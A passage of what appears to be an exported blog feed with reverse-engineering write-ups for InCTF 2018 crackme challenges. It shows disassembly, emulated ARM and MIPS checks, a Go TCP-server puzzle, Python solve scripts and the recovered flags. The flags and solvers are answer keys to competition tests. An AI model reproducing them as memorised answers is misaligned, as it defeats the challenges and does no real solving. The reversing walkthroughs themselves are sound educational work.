rdi, rax .text:0000000000400F87 call _uc_mem_write .text:0000000000400F8C lea rax, [rbp+var_20] .text:0000000000400F90 mov rdi, rax ; s .text:0000000000400F93 call _strlen .text:0000000000400F98 mov rcx, rax .text:0000000000400F9B mov rax, [rbp+var_28] .text:0000000000400F9F lea rdx, [rbp+var_20] .text:0000000000400FA3 mov esi, 12000h .text:0000000000400FA8 mov rdi, rax .text:0000000000400FAB call _uc_mem_write .text:0000000000400FB0 mov rax, [rbp+var_28] .text:0000000000400FB4 mov r8d, 0 .text:0000000000400FBA mov ecx, 0 .text:0000000000400FBF mov edx, 10044h .text:0000000000400FC4 mov esi, 10000h .text:0000000000400FC9 mov rdi, rax .text:0000000000400FCC call _uc_emu_start It maps 2 MiB space at virtual address 0x10000 as RWX. 0x48 bytes from 0x4016b0 are written into the address 0x10000. Then it writes the input string into the next page at 0x11000 and var_20 (magic string) at the virtual address 0x12000. Execution begins at 0x10000 and terminates at 0x10044. Lets see what the arm code at 0x4016b0 does\n0x00000000: mov r0, #0x11000 ; input string 0x00000004: mov r5, #0x12000 ; magic string 0x00000008: mov fp, #1 0x0000000c: mov r1, #0 0x00000010: ldrb r2, [r0, r1] 0x00000014: eor r2, r2, #5 0x00000018: and r2, r2, #0xff 0x0000001c: add r2, r2, #7 0x00000020: ldrb r3, [r5, r1] 0x00000024: and r3, r3, #0xff 0x00000028: add r1, r1, #1 0x0000002c: cmp r2, r3 0x00000030: beq #0x3c 0x00000034: mov fp, #0 0x00000038: b #0x44 0x0000003c: cmp r1, #0x13 0x00000040: ble #0x10 0x00000044: nop Pretty simple, magic[i] == (input[i]^5)+7. And we have\n┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf] └──╼ $ cat mast3r.py #!/usr/bin/env python magic = [0x78, 0x74, 0x3d, 0x61, 0x6f, 0x6b, 0x7d, 0x78, 0x3d, 0x7e, 0x61, 0x73, 0x7d, 0x61, 0x7e, 0x3c, 0x3c, 0x78, 0x77, 0x7d] print \u0026#39;\u0026#39;.join(map(lambda i: chr(i-7^5), magic)) ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf] └──╼ $ python mast3r.py th3_mast3r_is_r00tus ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf] └──╼ $ So, the input for the first stage is th3_mast3r_is_r00tus.\nStage-2 Validation .text:0000000000401057 mov rax, [rbp+input_string] .text:000000000040105B movzx eax, byte ptr [rax] .text:000000000040105E movsx eax, al .text:0000000000401061 mov [rbp+var_6C], eax .text:0000000000401064 mov rax, [rbp+input_string] .text:0000000000401068 add rax, 8 .text:000000000040106C movzx eax, byte ptr [rax] .text:000000000040106F movsx eax, al .text:0000000000401072 mov [rbp+var_68], eax .text:0000000000401075 mov rax, [rbp+input_string] .text:0000000000401079 add rax, 0Dh .text:000000000040107D movzx eax, byte ptr [rax] .text:0000000000401080 movsx eax, al .text:0000000000401083 mov [rbp+var_64], eax .text:0000000000401086 mov rax, [rbp+input_string] .text:000000000040108A mov rdi, rax ; s .text:000000000040108D call _strlen .text:0000000000401092 add rax, 1 .text:0000000000401096 add rax, rax .text:0000000000401099 cmp rax, 32h .text:000000000040109D jz short loc_4010B8 Nothing to explain here, var_6C, var_68, var_64 = input_string[0], input_string[8], input_string[13]. input_string must be of length 24\n.text:00000000004010B8 loc_4010B8: .text:00000000004010B8 mov rax, [rbp+input_string] .text:00000000004010BC lea rdx, [rax+10h] .text:00000000004010C0 lea rax, [rbp+dest] .text:00000000004010C4 mov rsi, rdx ; src .text:00000000004010C7 mov rdi, rax ; dest .text:00000000004010CA call _strcpy .text:00000000004010CF mov rax, [rbp+input_string] .text:00000000004010D3 lea rcx, [rax+1] .text:00000000004010D7 lea rax, [rbp+var_30] .text:00000000004010DB mov edx, 7 ; n .text:00000000004010E0 mov rsi, rcx ; src .text:00000000004010E3 mov rdi, rax ; dest .text:00000000004010E6 call _strncpy .text:00000000004010EB mov rax, [rbp+input_string] .text:00000000004010EF lea rcx, [rax+9] .text:00000000004010F3 lea rax, [rbp+var_20] .text:00000000004010F7 mov edx, 7 ; n .text:00000000004010FC mov rsi, rcx ; src .text:00000000004010FF mov rdi, rax ; dest .text:0000000000401102 call _strncpy .text:0000000000401107 lea rax, [rbp+dest] .text:000000000040110B mov esi, offset s2 ; \u0026quot;un1c0rn!\u0026quot; .text:0000000000401110 mov rdi, rax ; s1 .text:0000000000401113 call _strcmp .text:0000000000401118 test eax, eax .text:000000000040111A jz short loc_401126 So, we have dest, var_30, var_20 = input_string[16:], input_string[1:8], input_string[9:16] and dest == \u0026ldquo;un1c0rn!\u0026quot;\n.text:0000000000401126 lea rax, [rbp+var_40] .text:000000000040112A mov rdx, rax .text:000000000040112D mov esi, 4 ; UC_MODE_MIPS32 .text:0000000000401132 mov edi, 3 ; UC_ARCH_MIPS .text:0000000000401137 call _uc_open .text:000000000040113C mov [rbp+var_44], eax .text:000000000040113F cmp [rbp+var_44], 0 .text:0000000000401143 jz short loc_401170 Here I initially mistook the architecture to be x86 because I overlooked the fact that UC_ARCH_ARM = 1 is defined in the enum uc_arch.\n.text:0000000000401170 movzx eax, [rbp+var_20] .text:0000000000401174 movsx eax, al .text:0000000000401177 mov [rbp+var_60], eax .text:000000000040117A movzx eax, [rbp+var_1F] .text:000000000040117E movsx eax, al .text:0000000000401181 mov [rbp+var_5C], eax [ ... snip ... ] .text:00000000004012EE push 0 .text:00000000004012F0 mov r9d, 1 .text:00000000004012F6 mov r8d, 0 .text:00000000004012FC mov ecx, offset sub_400C26 .text:0000000000401301 mov edx, 4 ; UC_HOOK_CODE .text:0000000000401306 mov rdi, rax .text:0000000000401309 mov eax, 0 .text:000000000040130E call _uc_hook_add .text:0000000000401313 add rsp, 10h .text:0000000000401317 mov rax, [rbp+var_40] .text:000000000040131B mov r8d, 0 .text:0000000000401321 mov ecx, 0 .text:0000000000401326 mov edx, 100F8h .text:000000000040132B mov esi, 10000h .text:0000000000401330 mov rdi, rax .text:0000000000401333 call _uc_emu_start It then creates a 2 MiB address space at virtual address 0x10000. Code of length 0xf8 is written into 0x10000 from 0x401758. var_30 is written into the next page i.e., at 0x11000. Then the code sets up some registers, as follows\n regs[11] = input_string[0] ; r9, t1 regs[12] = input_string[8] ; r10, t2 regs[13] = input_string[13] ; r11, t3 regs[15] = input_string[9] ; r13, t5 regs[16] = input_string[10] ; r14, t6 regs[17] = input_string[11] ; r15, t7 regs[26] = input_string[12] ; r24, t8 regs[27] = input_string[13] ; r25, t9 regs[18] = input_string[14] ; r16, s0 regs[19] = input_string[15] ; r17, s1 A hook callback 0x400C28 is registered, which gets called during the execution of the code. Execution starts at 0x10000 and terminates at 0x100f8. Let\u0026rsquo;s take a look at the hook callback\n.text:0000000000400D48 cmp [rbp+address], 10010h .text:0000000000400D50 jnz short loc_400D96 .text:0000000000400D52 lea rdx, [rbp+var_34] .text:0000000000400D56 mov rax, [rbp+engine] .text:0000000000400D5A mov esi, 0Bh .text:0000000000400D5F mov rdi, rax .text:0000000000400D62 call _uc_reg_read .text:0000000000400D67 mov eax, [rbp+var_34] .text:0000000000400D6A cmp eax, 200h .text:0000000000400D6F jz short loc_400D96 .text:0000000000400D71 mov edi, offset format ; \u0026quot;Try Again!\u0026quot; .text:0000000000400D76 mov eax, 0 .text:0000000000400D7B call _printf [ ... snip ... ] .text:0000000000400D96 cmp [rbp+address], 10020h .text:0000000000400D9E jnz short loc_400DE4 .text:0000000000400DA0 lea rdx, [rbp+var_30] .text:0000000000400DA4 mov rax, [rbp+engine] .text:0000000000400DA8 mov esi, 0Ch .text:0000000000400DAD mov rdi, rax .text:0000000000400DB0 call _uc_reg_read .text:0000000000400DB5 mov eax, [rbp+var_30] .text:0000000000400DB8 cmp eax, 100h [ ... snip ... ] .text:0000000000400DE4 cmp [rbp+address], 10030h .text:0000000000400DEC jnz short loc_400E32 .text:0000000000400DEE lea rdx, [rbp+var_2C] .text:0000000000400DF2 mov rax, [rbp+engine] .text:0000000000400DF6 mov esi, 0Dh .text:0000000000400DFB mov rdi, rax .text:0000000000400DFE call _uc_reg_read .text:0000000000400E03 mov eax, [rbp+var_2C] .text:0000000000400E06 cmp eax, 400h [ ... snip ... ] .text:0000000000400E32 cmp [rbp+address], 100D0h .text:0000000000400E3A jnz short loc_400E61 .text:0000000000400E3C mov edi, offset aYouCanDoBetter ; \u0026quot;\\nYou can do better!\u0026quot; .text:0000000000400E41 mov eax, 0 .text:0000000000400E46 call _printf Here the code validates the registers. When $pc is at 0x10010, the value of regs[11] which is $t1 must be 0x200. At 0x10020, $t2 must be 0x100 and at 0x10030 $t3 should be 0x400. Finally, $pc must not execute at 0x100d0.\nLet\u0026rsquo;s disassemble the MIPS code\n0x00000000: addiu $t0, $zero, 0xa 0x00000004: mul $t1, $t1, $t0 0x00000008: addiu $t0, $zero, 2 0x0000000c: add $t1, $t1, $t0 0x00000010: addiu $t0, $zero, 0xa ; $t1 == 0x200 0x00000014: mul $t2, $t2, $t0 0x00000018: addiu $t0, $zero, 0xfe 0x0000001c: sub $t2, $t2, $t0 0x00000020: addiu $t0, $zero, 0x14 ; $t2 == 0x100 0x00000024: mul $t3, $t3, $t0 0x00000028: addiu $t0, $zero, 4 0x0000002c: add $t3, $t3, $t0 0x00000030: nop ; $t3 == 0x400 0x00000034: lui $t0, 1 0x00000038: ori $t0, $t0, 0x1000 ; $t0 = 0x11000 0x0000003c: lb $t4, ($t0) 0x00000040: addiu $t0, $t0, 1 0x00000044: addiu $t1, $zero, 0x72 0x00000048: bne $t4, $t1, 0xcc 0x0000004c: nop 0x00000050: lb $t4, ($t0) 0x00000054: addiu $t0, $t0, 1 0x00000058: addiu $t1, $zero, 0x5f 0x0000005c: bne $t4, $t1, 0xcc 0x00000060: nop 0x00000064: lb $t4, ($t0) 0x00000068: addiu $t0, $t0, 1 0x0000006c: addiu $t1, $zero, 0x61 0x00000070: bne $t4, $t1, 0xcc 0x00000074: nop 0x00000078: lb $t4, ($t0) 0x0000007c: addiu $t0, $t0, 1 0x00000080: addiu $t1, $zero, 0x6e 0x00000084: bne $t4, $t1, 0xcc 0x00000088: nop 0x0000008c: lb $t4, ($t0) 0x00000090: addiu $t0, $t0, 1 0x00000094: addiu $t1, $zero, 0x64 0x00000098: bne $t4, $t1, 0xcc 0x0000009c: nop 0x000000a0: lb $t4, ($t0) 0x000000a4: addiu $t0, $t0, 1 0x000000a8: addiu $t1, $zero, 0x5f 0x000000ac: bne $t4, $t1, 0xcc 0x000000b0: nop 0x000000b4: lb $t4, ($t0) 0x000000b8: addiu $t0, $t0, 1 0x000000bc: addiu $t1, $zero, 0x68 0x000000c0: bne $t4, $t1, 0xcc 0x000000c4: nop 0x000000c8: b 0xd4 0x000000cc: nop ; don't execute the next nop 0x000000d0: nop ; means we need to jump to 0xd4 0x000000d4: nop 0x000000d8: addiu $t5, $t5, 1 0x000000dc: addiu $t6, $t6, 2 0x000000e0: addiu $t7, $t7, 3 0x000000e4: addiu $t8, $t8, 4 0x000000e8: addiu $t9, $t9, 5 0x000000ec: addiu $s0, $s0, 6 0x000000f0: addiu $s1, $s1, 7 0x000000f4: nop We have,\n 0x200 = 2+10*$t1 =\u0026gt; $t1 = \u0026lsquo;3\u0026rsquo; 0x100 = 10*$t2-0xfe =\u0026gt; $t2 = \u0026lsquo;3\u0026rsquo; 0x400 = 4+$t3*0x14 =\u0026gt; $t3 = \u0026lsquo;3\u0026rsquo;  Therefore, input_string[0] = input_string[8] = input_string[13] = \u0026lsquo;3\u0026rsquo; The code from 0x34 validates var_30. So, var_30 = \u0026ldquo;\\x72\\x5f\\x61\\x6e\\x64\\x5f\\x68\u0026rdquo; which is r_and_h.\n.text:00000000004013FF mov eax, [rbp+_t5] ; $t5 .text:0000000000401402 cmp eax, 60h .text:0000000000401405 jnz short loc_401437 .text:0000000000401407 mov eax, [rbp+_t6] ; $t6 .text:000000000040140A cmp eax, 6Eh .text:000000000040140D jnz short loc_401437 .text:000000000040140F mov eax, [rbp+_t7] ; $t7 .text:0000000000401412 cmp eax, 33h .text:0000000000401415 jnz short loc_401437 .text:0000000000401417 mov eax, [rbp+_t8] ; $t8 .text:000000000040141A cmp eax, 7Ah .text:000000000040141D jnz short loc_401437 .text:000000000040141F mov eax, [rbp+_t9] ; $t9 .text:0000000000401422 cmp eax, 38h .text:0000000000401425 jnz short loc_401437 .text:0000000000401427 mov eax, [rbp+_s0] ; $s0 .text:000000000040142A cmp eax, 79h .text:000000000040142D jnz short loc_401437 .text:000000000040142F mov eax, [rbp+_s1] ; $s1 .text:0000000000401432 cmp eax, 66h .text:0000000000401435 jz short loc_40144A Now, we can find out input_string[9:16], which is\nprint \u0026#39;\u0026#39;.join(map(lambda (i, j): chr(j-i), zip(xrange(1, 8), [0x60, 0x6e, 0x33, 0x7a, 0x38, 0x79, 0x66]))) So, the string for stage2 is input_string[0] + var_30 + input_string[8] + var_20 + dest = \u0026quot;3r_and_h3_l0v3s_un1c0rn!\u0026quot;\n.text:0000000000401565 mov edi, offset aStage2Complete ; \u0026quot;\\nStage 2 completed!\u0026quot; .text:000000000040156A call _puts .text:000000000040156F mov edi, offset aGoodWork ; \u0026quot;\\nGood Work!!\u0026quot; .text:0000000000401574 call _puts .text:0000000000401579 lea rdx, [rbp+stage2_input] .text:000000000040157D lea rax, [rbp+stage1_input] .text:0000000000401581 mov rsi, rdx .text:0000000000401584 mov rdi, rax .text:0000000000401587 call sub_401471 .text:0000000000401471 sub_401471 proc near .text:0000000000401471 .text:0000000000401471 var_10 = qword ptr -10h .text:0000000000401471 var_8 = qword ptr -8 .text:0000000000401471 .text:0000000000401471 push rbp .text:0000000000401472 mov rbp, rsp .text:0000000000401475 sub rsp, 10h .text:0000000000401479 mov [rbp+var_8], rdi .text:000000000040147D mov [rbp+var_10], rsi .text:0000000000401481 mov edi, offset s ; \u0026quot;-------------------\u0026quot; .text:0000000000401486 call _puts .text:000000000040148B mov rdx, [rbp+var_10] .text:000000000040148F mov rax, [rbp+var_8] .text:0000000000401493 mov rsi, rax .text:0000000000401496 mov edi, offset aTheFlagIsInctf ; \u0026quot;The FLAG is: inctf{\\%s\\%s}\\n\u0026quot; .text:000000000040149B mov eax, 0 .text:00000000004014A0 call _printf .text:00000000004014A5 nop .text:00000000004014A6 leave .text:00000000004014A7 retn .text:00000000004014A7 sub_401471 endp Great! now we have the flag - \u0026ldquo;inctf{\u0026rdquo; + stage1_input + stage2_input + \u0026ldquo;}\u0026rdquo; = \u0026quot;inctf{th3_mast3r_is_r00tus3r_and_h3_l0v3s_un1c0rn!}\u0026quot;\n","date":"2018-10-07T00:00:00+05:30","permalink":"http://localhost:1313/post/inctf-2018-mast3r/","title":"InCTF 2018 - mast3r"},{"content":"Its a golang binary. The first task is to find \u0026lsquo;main_main\u0026rsquo; routine. Its located at 0x4ebcc0\n.text:00000000004EBD15 lea rax, off_53B6E8 .text:00000000004EBD1C mov [rsp+198h+var_190], rax .text:00000000004EBD21 call runtime_deferproc .rodata:000000000053B6E8 off_53B6E8 dq offset main_final .rodata:000000000053B6F0 off_53B6F0 dq offset main_handleit Okay, so we have a deferred call to \u0026lsquo;main_final\u0026rsquo;. It prints \u0026lsquo;Enter pass:\u0026rsquo; and calls Reader_Read to read a string which is converted to a byte array using runtime_stringtoslicebyte and calls main_obfus, which looks like this\ndef main_obfus(bytes) temp = bytes[::-1] return temp[9:11]+temp[11:13]+temp[:9] main_main then stores the array of bytes returned by main_obfus and stores into a global variable at 0x5de130. It stores len(temp[9:11])+len(temp[11:13]) in 0x5de138, len(temp[:9]) in 0x5de148, and len(temp[:9]) in 0x5de140.\nmain_final calls main_swap with four arguments - the string at 0x5de130, 4, 0x5de134, 9. Let\u0026rsquo;s take a look at main_swap\ndef main_swap(a, b, c, d) if main_check(a, b): exit() if \u0026#39;.\u0026#39; in c[:d]: exit() def main_check(string, len): try: int(string[:len]) except: exit() So, 0x5de130 must contain 4 digits, followed by a string of length 9 without any \u0026lsquo;.\u0026rsquo;. It calls net_Listen on the string \u0026ldquo;%s:%s\u0026rdquo; % (0x5de134, 0x5de130) Now, the password is clear. 0x5de134 stores the hostname which is of 9 letters without any dot - \u0026ldquo;localhost\u0026rdquo;. And the 4 digits at 0x5de130 represent the port, for the tcp server.\nLet\u0026rsquo;s take the port as 1234. So, what will be our password ? Go to main_obfus and take a look. The first two characters of the input are insignificant the remaining is \u0026ldquo;localhost1234\u0026rdquo;[::-1].\nLet\u0026rsquo;s try \u0026ldquo;xx4321tsohlacol\u0026rdquo; as input. Which will make main_final start a tcp server at localhost:1234.\nFor every incoming connection, main_handleit is called. In main_handleit, the string written to the socket must be of length 16.\n.text:00000000004ED125 call rcx ; net__ptr_TCPConn_Read .text:00000000004ED127 mov rax, [rsp+1D0h+var_98] .text:00000000004ED12F mov [rsp+1D0h+var_1D0], rax .text:00000000004ED133 mov rcx, [rsp+1D0h+var_178] .text:00000000004ED138 mov [rsp+1D0h+var_1C8], rcx .text:00000000004ED13D mov rdx, [rsp+1D0h+var_170] .text:00000000004ED142 mov [rsp+1D0h+var_1C0], rdx .text:00000000004ED147 call main_findlen .text:00000000004ED14C mov rax, [rsp+1D0h+var_1B8] .text:00000000004ED151 cmp rax, 10h .text:00000000004ED155 jnz loc_4ED4D7 .text:00000000004ED15B mov rcx, [rsp+1D0h+port] .text:00000000004ED160 xor edx, edx .text:00000000004ED162 jmp short loc_4ED18E We have an array of qwords computed as follows\nvar_130 = [0x327, 0x125, 0x436, 0xc91, 0x167, 0x282] var_100 = [0 for _ in xrange(len(var_130))] for i in xrange(len(var_130)): var_100[i] = port % var_130[i] It then calls main_obfus2 with the string read from the socket as argument\n.text:00000000004ECD01 mov rax, cs:port_len ; 0x5de138 .text:00000000004ECD08 mov rcx, cs:socket_address ; 0x5de130 .text:00000000004ECD0F mov rdx, [rsp+60h+arg_8] ; string length .text:00000000004ECD14 cmp rdx, rax .text:00000000004ECD17 jge loc_4ECF0C [ ... snip ... ] .text:00000000004ECF0C loc_4ECF0C: .text:00000000004ECF0C mov rdx, [rsp+60h+arg_0] .text:00000000004ECF11 mov [rsp+60h+var_60], rdx ; string read .text:00000000004ECF15 mov [rsp+60h+var_58], rax ; port length .text:00000000004ECF1A mov [rsp+60h+var_50], rcx ; socket address - 1234localhost .text:00000000004ECF1F mov [rsp+60h+var_48], rax ; port length .text:00000000004ECF24 call runtime_eqstring .text:00000000004ECF29 movzx eax, byte ptr [rsp+60h+var_40] .text:00000000004ECF2E mov rdx, [rsp+60h+arg_8] .text:00000000004ECF33 jmp loc_4ECD1F Great, so the first 4 bytes of the input must be the port of the tcp server.\n.text:00000000004ECD1F test al, al .text:00000000004ECD21 jz loc_4ECEFD .text:00000000004ECD27 mov rax, cs:host_len ; length of host (in password) .text:00000000004ECD2E mov rcx, cs:aHost ; address in 0x5de140 .text:00000000004ECD35 cmp rax, 7 .text:00000000004ECD39 jb loc_4ECF3F .text:00000000004ECD3F mov rax, [rsp+60h+arg_0] .text:00000000004ECD44 mov [rsp+60h+var_60], rax ; string read from socket .text:00000000004ECD48 mov [rsp+60h+var_58], rdx ; string length .text:00000000004ECD4D add rcx, 4 .text:00000000004ECD51 mov [rsp+60h+var_50], rcx ; \u0026amp;hostname[0]+4 .text:00000000004ECD56 mov [rsp+60h+var_48], 3 ; 3 chars substring .text:00000000004ECD5F call strings_Index .text:00000000004ECD64 mov rax, [rsp+60h+var_40] .text:00000000004ECD69 cmp rax, 4 .text:00000000004ECD6D jnz loc_4ECEEE .text:00000000004ECD73 mov rax, [rsp+60h+arg_8] .text:00000000004ECD78 cmp rax, 0Ch .text:00000000004ECD7C jb loc_4ECF38 .text:00000000004ECD82 mov rax, [rsp+60h+arg_0] .text:00000000004ECD87 add rax, 7 .text:00000000004ECD8B mov [rsp+60h+var_10], rax .text:00000000004ECD90 mov [rsp+60h+var_60], rax .text:00000000004ECD94 mov [rsp+60h+var_58], 5 .text:00000000004ECD9D call main_check hostName must be of length atleast 7. The index of hostname[4:7] in the string must be 4. The string length must be atleast 12 So, we have - the string is of the format \u0026ldquo;1234????????????\u0026quot; where \u0026lsquo;?\u0026rsquo; is unknown.\nNow, string[4:7] == \u0026ldquo;localhost\u0026rdquo;[4:7]. Thus the string now is \u0026ldquo;1234lho?????????\u0026quot;. It then calls main_check on string[7:12], which implies, the 5 characters from offset 7 must be digits.\n.text:00000000004ECDBA loc_4ECDBA: .text:00000000004ECDBA mov rax, [rsp+60h+var_10] .text:00000000004ECDBF mov [rsp+60h+var_60], rax .text:00000000004ECDC3 mov [rsp+60h+var_58], 5 .text:00000000004ECDCC call strconv_Atoi .text:00000000004ECDD1 mov rax, [rsp+60h+var_48] .text:00000000004ECDD6 mov rcx, [rsp+60h+var_50] .text:00000000004ECDDB test rax, rax .text:00000000004ECDDE jnz loc_4ECEDF .text:00000000004ECDE4 mov [rsp+60h+var_60], rcx .text:00000000004ECDE8 call math_big_NewInt .text:00000000004ECDED mov rax, [rsp+60h+var_58] .text:00000000004ECDF2 mov [rsp+60h+var_30], rax ; var_30 = int(string[7:12]) .text:00000000004ECDF7 mov [rsp+60h+var_60], 7Bh .text:00000000004ECDFF call math_big_NewInt .text:00000000004ECE04 mov rax, [rsp+60h+var_58] .text:00000000004ECE09 mov [rsp+60h+var_38], rax ; var_38 = 0x7b .text:00000000004ECE0E mov [rsp+60h+var_60], 81BBh .text:00000000004ECE16 call math_big_NewInt .text:00000000004ECE1B mov rax, [rsp+60h+var_58] .text:00000000004ECE20 mov [rsp+60h+var_28], rax ; var_28 = 0x81bb .text:00000000004ECE25 mov [rsp+60h+var_60], 84h .text:00000000004ECE2D call math_big_NewInt .text:00000000004ECE32 mov rax, [rsp+60h+var_58] .text:00000000004ECE37 mov [rsp+60h+var_20], rax ; var_20 = 0x84 .text:00000000004ECE3C mov [rsp+60h+var_60], 0A7D5h .text:00000000004ECE44 call math_big_NewInt .text:00000000004ECE49 mov rax, [rsp+60h+var_58] .text:00000000004ECE4E mov [rsp+60h+var_18], rax ; var_18 = 0xa7d5 Now we have, (var_30 + var_38 ^ var_28) - var_20 == var_18. Thus var_30 = (var_18+var_20 ^ var_28)-var_38 = 10599\nThe string, now is 1234lho10599??? as a newline is appended as the 15th char.\nmain_handleit now calls main_hasherboy.\ndef hasherboy(string): hash = map(ord, md5(string[:12]).hexdigest()) magic = [124, 81, 11, 120, 106, 5, 95, 6, 65, 102, 97, 7, 22, 103, 98, 4, 17, 15, 12, 114, 18, 20, 69, 117, 4, 78, 82, 59, 54, 81, 28, 67] ans = [] for i in xrange(len(magic)): ans.append(hash[i] ^ magic[i]) return \u0026#39;\u0026#39;.join(map(chr, ans)) print \u0026#39;The Flag is : \u0026#39;, ans = \u0026#39;\u0026#39; var_D0 = [i for i in var_100] for i in var_D0: print(end=\u0026#39;\u0026#39;, chr(i)) print hasherboy(string) + \u0026#34;}\u0026#34; Great! now we can find the port of the tcp server easily. Recall that, var_100 = [port % i for i in [0x327, 0x125, 0x436, 0xc91, 0x167, 0x282]] and since the flag starts with \u0026ldquo;inctf{\u0026quot;, we have\n┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf] └──╼ $ cat solve.py #!/usr/bin/env python magic = [0x327, 0x125, 0x436, 0xc91, 0x167, 0x282] for port in xrange(0x10000): if \u0026#39;inctf{\u0026#39; == \u0026#39;\u0026#39;.join([chr(port % i \u0026amp; 0xff) for i in magic]): print \u0026#39;[*] Port: %d\u0026#39; % port break ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf] └──╼ $ python solve.py [*] Port: 3333 ┌─[x0r19x91@x0r19x91]─[~/Desktop/ctf/inctf] └──╼ $ So, the password is \u0026ldquo;XX3333tsohlacol\u0026rdquo; and the string to be sent to the server at localhost:3333 is \u0026ldquo;3333lho10599XXX\u0026rdquo; where X can be any character. The flag is \u0026ldquo;inctf{\u0026rdquo; + hasherboy(\u0026ldquo;3333lho10599\u0026rdquo;) + \u0026ldquo;}\u0026quot; which is \u0026quot;inctf{D4mN_7h4t_W4s_T1rinG!!!L0v3_R3x!}\u0026quot;\n","date":"2018-10-07T00:00:00+05:30","permalink":"http://localhost:1313/post/inctf-2018-ultimate-goal/","title":"InCTF 2018 - Ultimate GOal"},{"content":"Fire up Radare and open the binary\npush rbp mov rbp,rsp sub rsp,0x50 mov rax,QWORD PTR fs:0x28 mov QWORD PTR [rbp-0x8],rax xor eax,eax mov esi,0x40109b mov edi,0xb call 0x4abd40 mov BYTE PTR [rbp-0x20],0x4d ; \u0026quot;MGNCHXWIZDJAOKPELYSFUTV\u0026quot; mov BYTE PTR [rbp-0x1f],0x47 mov BYTE PTR [rbp-0x1e],0x4e mov BYTE PTR [rbp-0x1d],0x43 mov BYTE PTR [rbp-0x1c],0x48 mov BYTE PTR [rbp-0x1b],0x58 mov BYTE PTR [rbp-0x1a],0x57 mov BYTE PTR [rbp-0x19],0x49 mov BYTE PTR [rbp-0x18],0x5a mov BYTE PTR [rbp-0x17],0x44 mov BYTE PTR [rbp-0x16],0x4a mov BYTE PTR [rbp-0x15],0x41 mov BYTE PTR [rbp-0x14],0x4f mov BYTE PTR [rbp-0x13],0x4b mov BYTE PTR [rbp-0x12],0x50 mov BYTE PTR [rbp-0x11],0x45 mov BYTE PTR [rbp-0x10],0x4c mov BYTE PTR [rbp-0xf],0x59 mov BYTE PTR [rbp-0xe],0x53 mov BYTE PTR [rbp-0xd],0x46 mov BYTE PTR [rbp-0xc],0x55 mov BYTE PTR [rbp-0xb],0x54 mov BYTE PTR [rbp-0xa],0x56 mov esi,0x54fa2a ; \u0026quot;Enter Input:\u0026quot; mov edi,0x7accc0 call 0x40e670 mov DWORD PTR [rbp-0x48],0x0 loop_0: cmp DWORD PTR [rbp-0x48],0x16 jg end_0 lea rdx,[rbp-0x40] mov eax,DWORD PTR [rbp-0x48] cdqe add rax,rdx mov rsi,rax mov edi,0x7acde0 call 0x408ca0 add DWORD PTR [rbp-0x48],0x1 jmp loop_0 end_0: mov eax,0x17 mov DWORD PTR [rbp-0x44],eax mov edx,DWORD PTR [rbp-0x44] ; length lea rcx,[rbp-0x40] lea rax,[rbp-0x20] mov rsi,rcx ; our input string mov rdi,rax ; magic string call check mov eax,DWORD PTR [rip+0x3aabc7] # 0x7abd70 cmp eax,0x17 jne invalid_input lea rax,[rbp-0x40] mov rdi,rax call print_flag jmp finish invalid_input: mov esi,0x54fa25 ; \u0026quot;Nope\u0026quot; mov edi,0x7accc0 call 0x40e670 finish: mov eax,0x0 mov rcx,QWORD PTR [rbp-0x8] xor rcx,QWORD PTR fs:0x28 je $+7 call 0x50a840 leave ret The routine validates a string of length atleast 23 bytes using the magic string \u0026ldquo;MGNCHXWIZDJAOKPELYSFUTV\u0026rdquo;. Let\u0026rsquo;s take a look at check routine.\n0x00400eb4 55 push rbp 0x00400eb5 4889e5 mov rbp, rsp 0x00400eb8 4883ec30 sub rsp, 0x30 ; '0' 0x00400ebc 48897de8 mov qword [local_18h], rdi 0x00400ec0 488975e0 mov qword [local_20h], rsi 0x00400ec4 8955dc mov dword [local_24h], edx 0x00400ec7 488b45e0 mov rax, qword [local_20h] 0x00400ecb 0fb600 movzx eax, byte [rax] 0x00400ece 0fbec8 movsx ecx, al 0x00400ed1 8b55dc mov edx, dword [local_24h] 0x00400ed4 488b45e8 mov rax, qword [local_18h] 0x00400ed8 89ce mov esi, ecx 0x00400eda 4889c7 mov rdi, rax 0x00400edd e88cffffff call fcn.00400e6e 0x00400ee2 8945fc mov dword [local_4h], eax 0x00400ee5 837dfc00 cmp dword [local_4h], 0 ┌─\u0026lt; 0x00400ee9 741a je 0x400f05 │ 0x00400eeb 488b45e0 mov rax, qword [local_20h] │ 0x00400eef 488d4801 lea rcx, rax + 1 ; 1 │ 0x00400ef3 8b55fc mov edx, dword [local_4h] │ 0x00400ef6 488b45e8 mov rax, qword [local_18h] │ 0x00400efa 4889ce mov rsi, rcx │ 0x00400efd 4889c7 mov rdi, rax │ 0x00400f00 e8afffffff call fcn.00400eb4 └─\u0026gt; 0x00400f05 8b45dc mov eax, dword [local_24h] 0x00400f08 83e801 sub eax, 1 0x00400f0b 3b45fc cmp eax, dword [local_4h] ┌─\u0026lt; 0x00400f0e 7434 je 0x400f44 │ 0x00400f10 8b45dc mov eax, dword [local_24h] │ 0x00400f13 2b45fc sub eax, dword [local_4h] │ 0x00400f16 8d50ff lea edx, rax - 1 │ 0x00400f19 8b45fc mov eax, dword [local_4h] │ 0x00400f1c 4898 cdqe │ 0x00400f1e 488d4801 lea rcx, rax + 1 ; 1 │ 0x00400f22 488b45e0 mov rax, qword [local_20h] │ 0x00400f26 4801c1 add rcx, rax ; '#' │ 0x00400f29 8b45fc mov eax, dword [local_4h] │ 0x00400f2c 4898 cdqe │ 0x00400f2e 488d7001 lea rsi, rax + 1 ; 1 │ 0x00400f32 488b45e8 mov rax, qword [local_18h] │ 0x00400f36 4801f0 add rax, rsi ; '+' │ 0x00400f39 4889ce mov rsi, rcx │ 0x00400f3c 4889c7 mov rdi, rax │ 0x00400f3f e870ffffff call fcn.00400eb4 └─\u0026gt; 0x00400f44 488b45e0 mov rax, qword [local_20h] 0x00400f48 0fb600 movzx eax, byte [rax] 0x00400f4b 0fbec0 movsx eax, al 0x00400f4e 89c7 mov edi, eax 0x00400f50 e869feffff call fcn.00400dbe 0x00400f55 90 nop 0x00400f56 c9 leave 0x00400f57 c3 ret The above routine is equivalent to the following\nint count = 0; void match(char ch) // fcn.00400dbe  { char buf[] = \u0026#34;MNGHCWZIJDXOPKLESUVTFYA\u0026#34;; if (buf[count] == ch) ++count; } void check(char* str, char* answer, int n) // fcn.00400eb4  { int pos = find_char(str, answer[0], 